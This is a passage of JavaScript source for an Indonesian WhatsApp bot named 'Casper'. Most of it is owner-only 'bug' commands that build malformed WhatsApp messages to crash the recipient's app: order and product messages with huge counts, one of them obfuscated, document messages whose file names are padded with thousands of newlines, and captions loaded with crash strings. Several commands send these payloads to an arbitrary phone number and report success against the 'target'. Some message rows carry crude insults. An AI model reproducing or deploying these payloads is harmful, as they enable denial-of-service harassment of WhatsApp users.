if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.limit)) user.limit = limitUser
} else global.db.data.users[m.sender] = {
afkTime: -1,
afkReason: '',
limit: limitUser,
}
let setting = global.db.data.settings[botNumber]
        if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
	    if (setting) {
		if (!isNumber(setting.status)) setting.status = 0	
	    } else global.global.db.data.settings[botNumber] = {
		status: 0,		
	    }	            
} catch (err) {
console.log(err)
}
let cron = require('node-cron')
cron.schedule('00 12 * * *', () => {
let user = Object.keys(global.db.data.users)
let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
for (let jid of user) global.db.data.users[jid].limit = limitUser
console.log('Reseted Limit')
}, {
scheduled: true,
timezone: "Asia/Jakarta"
})
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of mentionUser) {
let user = global.db.data.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
m.reply(`
Apakah Ada Yang Ingin Di Tanyakan ${reason ? 'Ada Yang Bisa Saya Bantu? ' + reason : 'Terima Kasih'}
Waktu ${clockString(new Date - afkTime)}
`.trim())
}
if (db.data.users[m.sender].afkTime > -1) {
let user = global.db.data.users[m.sender]
m.reply(`
Hello Saya Bot Casper${user.afkReason ? ' Baiklah ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}
//=================================================//

//=================================================//
switch(command) {
//=================================================//
case 'ythwmodsgans00':{
if (isRegistered) return reply('Akun Kamu Sudah Terverfikasi!!!')
await sendButRegis(from)
}
break

//BUG PUBLIC
case 'jaditroli': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} kesper`)
let teks = `${q}`
{
a = await kesper.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: thumb}}}
var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": virgam,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${teks}`,
"orderTitle": `${teks}`,
"sellerJid": "62882003133773@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: m.chat, quoted:m })
kesper.relayMessage(m.chat, order.message, { messageId: order.key.id })
}
}
break
//=================================================//
case 'jadilokas': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} kesper`)
let teks = `${q}`
{
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./casper-file/image/hwmodsgans.jpg') }, { upload: kesper.waUploadToServer })
var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9367014,
"degreesLongitude": 107.7228574,
"caption": ` ${teks} ${ngazap(prefix)}`,
"sequenceNumber": "1657237469254001",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted:m })
kesper.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.id })
}
}
break
//=================================================//
case 'jadipolling': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} kesper`)
let teks = `${q}`
{
var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"pollCreationMessage": {
"name": `Salam kenal saya ${teks}`,
"options": [
{
"optionName": `Saya ${teks}`
},
{
"optionName": `Dimari Kalau Ada ${teks} Jangan lari`
}
],
"selectableOptionsCount": 2
}
}), { userJid: m.chat, quoted:m })
kesper.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
}
}
break
//=================================================//
case 'jadikatalog': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!quoted) throw 'Reply Image/sticker'
let teks = `${q}`
{
function _0x348d(_0x50ce67,_0x2397a1){var _0x15bb19=_0x15bb();return _0x348d=function(_0x348dc9,_0x408474){_0x348dc9=_0x348dc9-0x173;var _0x50d082=_0x15bb19[_0x348dc9];return _0x50d082;},_0x348d(_0x50ce67,_0x2397a1);}var _0x7bda59=_0x348d;(function(_0x2b7a6b,_0x258fac){var _0x3a2d72=_0x348d,_0x26e08e=_0x2b7a6b();while(!![]){try{var _0x574dc3=-parseInt(_0x3a2d72(0x179))/0x1+-parseInt(_0x3a2d72(0x183))/0x2+-parseInt(_0x3a2d72(0x176))/0x3+parseInt(_0x3a2d72(0x17e))/0x4+-parseInt(_0x3a2d72(0x182))/0x5+parseInt(_0x3a2d72(0x180))/0x6+-parseInt(_0x3a2d72(0x173))/0x7;if(_0x574dc3===_0x258fac)break;else _0x26e08e['push'](_0x26e08e['shift']());}catch(_0x36dddf){_0x26e08e['push'](_0x26e08e['shift']());}}}(_0x15bb,0xac052));let media=await quoted[_0x7bda59(0x17d)](quoted);function _0x15bb(){var _0x1beac5=['586320XahqHr','chat','waUploadToServer','key','download','5612456xbkxWC','message','6419334pqEaRs','HW\x20MODS\x20WA\x20','1899640aXNWfS','473494FRUydx','3030587FfNbLm','Message','wa.me/62882003133773','397419wzTxRp','62882003133773@s.whatsapp.net','fromObject'];_0x15bb=function(){return _0x1beac5;};return _0x15bb();}var messa=await prepareWAMessageMedia({'image':media},{'upload':kesper[_0x7bda59(0x17b)]}),catalog=generateWAMessageFromContent(m['chat'],proto[_0x7bda59(0x174)][_0x7bda59(0x178)]({'productMessage':{'product':{'productImage':messa['imageMessage'],'productId':'','jpegThumbnail':ppnyauser,'title':text+'\x20'+buttonkal,'description':text+'\x20'+buttonkal,'productImageCount':0x3b9ac9ff,'firstImageId':0x1,'retailerId':_0x7bda59(0x181)+bugsw,'bodyText':''+text,'footerText':''+text,'url':_0x7bda59(0x175)},'businessOwnerJid':_0x7bda59(0x177),'contextInfo':{'forwardingScore':0x96,'isForwarded':!![]}}}),{'userJid':m[_0x7bda59(0x17a)],'quoted':m});kesper['relayMessage'](m[_0x7bda59(0x17a)],catalog[_0x7bda59(0x17f)],{'messageId':catalog[_0x7bda59(0x17c)]['id']});
}
}
break
//=================================================//
case 'jadidocu': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} kesper`)
let teks = `${q}`
{
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "𝗕𝗔𝗦𝗘 𝗦𝗜𝗗",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `🔥 ${teks} ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
}
}), { userJid: m.chat })
kesper.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
}
break
//=================================================//
case 'jadidarknes': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} kesper`)
let teks = `${q}`
{
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqdSNOaicHcP1vw_2qKlkG3AB8udWmo47Y9rmKjnLUss.enc",
"mimetype": "*/*",
"title": "IMG-20220802-WA0052.jpeg",
"fileSha256": "iKJGFOiAl6DNllhc+9g7t8kwSKTl50TqZaIerGCa1OM=",
"pageCount": 0,
"mediaKey": "inQAnlhVJdu5dMUKr86iWUJnG/umzHeUGrlD7qqAN/I=",
"fileName": `🔥 ${teks} ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.jpeg`,
"fileEncSha256": "Ndb8qq5fOJW56Hn8bB3+NNvxfTnZtrVnPM97Ak3ON+c=",
"directPath": "/v/t62.7119-24/30623311_146834807959315_9176799642226465389_n.enc?ccb=11-4&oh=01_AVxHWupe_fRozKysLEUfowD0Z_apYBve1H3C_MGsaD4mCw&oe=630DC76C",
"mediaKeyTimestamp": "1659416157",
}
}), { userJid: m.chat })
kesper.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
}
break
//=================================================//
case 'jadivirtext1': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} kesper`)
let teks = `${q}`
{
kesper.sendMessage(m.chat, { image: casthumb, caption: `🔥 ${teks} ${iphone}` }, { quoted:m })
}
}
break
//=================================================//
case 'jadivirtext2': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} kesper`)
let teks = `${q}`
{
kesper.sendMessage(m.chat, { image: casthumb, caption: `🔥 ${teks} ${iphone1}` }, { quoted:m })
}
}
break
//=================================================//
case 'jadivirtex3t': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} kesper`)
let teks = `${q}`
{
kesper.sendMessage(m.chat, { image: ppnyauser,  caption: `🔥 ${teks} ${iphone2}` }, { quoted:m })
}
}
break
//=================================================//
case 'jadivirtext4': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} kesper`)
let teks = `${q}`
{
kesper.sendMessage(m.chat, { image: ppnyauser,  caption: `🔥 ${teks} ${iphone3}` }, { quoted:m })
}
}
break
//=================================================//
case 'jadivirtext5': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} kesper`)
let teks = `${q}`
{
kesper.sendMessage(m.chat, { image: ppnyauser,  caption: `🔥 ${teks} ${iphone4}` }, { quoted:m })
}
}
break
//=================================================//
case 'jadivirtext6': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} kesper`)
let teks = `${q}`
{
kesper.sendMessage(m.chat, { image: ppnyauser,  caption: `🔥 ${teks} ${iphone5}` }, { quoted:m })
}
}
break
//=================================================//
case 'jadivirtext7': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} kesper`)
let teks = `${q}`
{
kesper.sendMessage(m.chat, { image: ppnyauser,  caption: `🔥 ${teks} ${iphone6}` }, { quoted:m })
}
}
break
//=================================================//
case 'jadivirtext8': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} kesper`)
let teks = `${q}`
{
kesper.sendMessage(m.chat, { image: ppnyauser,  caption: `🔥 ${teks} ${buttonkal}` }, { quoted:m })
}
}
break
//=================================================//
case 'jadivirtext9': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} kesper`)
let teks = `${q}`
{
kesper.sendMessage(m.chat, { image: ppnyauser,  caption: `🔥 ${teks} ${buttonvirus}` }, { quoted:m })
}
}
break
//=================================================//
case 'jadivirtext10': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} kesper`)
let teks = `${q}`
{
kesper.sendMessage(m.chat, { image: ppnyauser,  caption: `🔥 ${teks} ${ngazap(prefix)}`}, { quoted:m })
}
}
break
//=================================================//
case 'jadibuginvite': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} kesper`)
let teks = `${q}`
{
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./casper-file/image/hwmodsgans.jpg') }, { upload: kesper.waUploadToServer })
var groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": `MY NAME 🔥 ${teks} ${ngazap(prefix)}`,
"groupName": `MY NAME 🔥 ${teks} ${ngazap(prefix)}`,
"caption": `🔥 ${teks} ${ngazap(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted:m })
kesper.relayMessage(m.chat, groupInvite.message, { messageId: groupInvite.key.id })
}
}
break
//=================================================//
case 'jadibugpayment' : {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} kesper`)
let teks = `${q}`
{
kesper.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `SC Casper`,"body": `Selamat ${salam} kak ${pushname}`,
mimetype: 'audio/mpeg', caption: `🔥 ${teks} ${buttonkal}`,
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/HwModsWa857`,
thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
}
}}}}}, { quoted:m})
}
}
break
//=================================================//
//=================================================//
case 'jadibugsw': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} kesper`)
let teks = `${q}`
{
joau = fs.readFileSync('./casper-file/video/kesper.mp4')
kesper.sendMessage(m.chat, { video: joau, mimetype: 'video/mp4', caption: `🔥 ${teks} ${buttonkal}` }, { quoted:m })
}
}
break
//=================================================//
case 'jadibugbutton':
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} kesper`)
let teks = `${q}`
{
const buttonssk = [
{buttonId: `${prefix}djisdjiwdjjes`, buttonText: {displayText: buttonvirus}, type: 1},
{buttonId: 'babaabbabababa', buttonText: {displayText: buttonvirus}, type: 1},
{buttonId: 'babababbababa', buttonText: {displayText: buttonvirus}, type: 1}
]
const buttonnnnmMessage = {
text: `🔥 ${teks} ${bugsw}`,
footerText: '🔥 ${teks} ',
buttons: buttonssk,
headerType: 1
}
kesper.sendMessage(m.chat, buttonnnnmMessage)
}
 break
//=================================================//
case 'sendbuglist': case 'sendbuglist2': case 'sendbuglist3': case 'sendbuglist4': case 'sendbuglist5':
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
touchmebre = [
{
title: ` Casper ${buttonvirus} ${buttonvirus}`,
rows: [
{title: buttonvirus, rowId: `asu'+$+$+$+2+#`, description: `Hay Kontol`},
{title: buttonvirus, rowId: `!$(2!*($!$8_!#!#+$`, description: `Hay Anak" Ngentod`}
]
}
]
kesper.sendListMsg(Pe, `Casper`, kesper.user.name, `Hay Kak Sc Bot Adia Di List`, `Click Here `, touchmebre, m)
break
//=================================================//
case 'sendtrol': case 'sendtrol3': case 'sendtrol4': case 'sendtrol5': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${ownername}`,jpegThumbnail: thumb}}}
var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": virgam,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": " BY Casper",
"orderTitle": " BUG TROLI ", // 
"sellerJid": "62882003133773@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: m.chat, quoted:m})
kesper.relayMessage(Pe, order.message, { messageId: order.key.id })
}
break
//=================================================//
case 'senddocu': case 'senddocu3': case 'senddocu4': case 'senddocu5': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "𝗕𝗔𝗦𝗘 𝗦𝗜𝗗",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `🔥 ☆DARKNESS⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
}
}), { userJid: m.chat })
kesper.relayMessage(Pe, document.message, { messageId: document.key.id })
reply('sukses Bug target')
}
break
//=================================================//
case 'senddocu2': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqdSNOaicHcP1vw_2qKlkG3AB8udWmo47Y9rmKjnLUss.enc",
"mimetype": "*/*",
"title": "IMG-20220802-WA0052.jpeg",
"fileSha256": "iKJGFOiAl6DNllhc+9g7t8kwSKTl50TqZaIerGCa1OM=",
"pageCount": 0,
"mediaKey": "inQAnlhVJdu5dMUKr86iWUJnG/umzHeUGrlD7qqAN/I=",
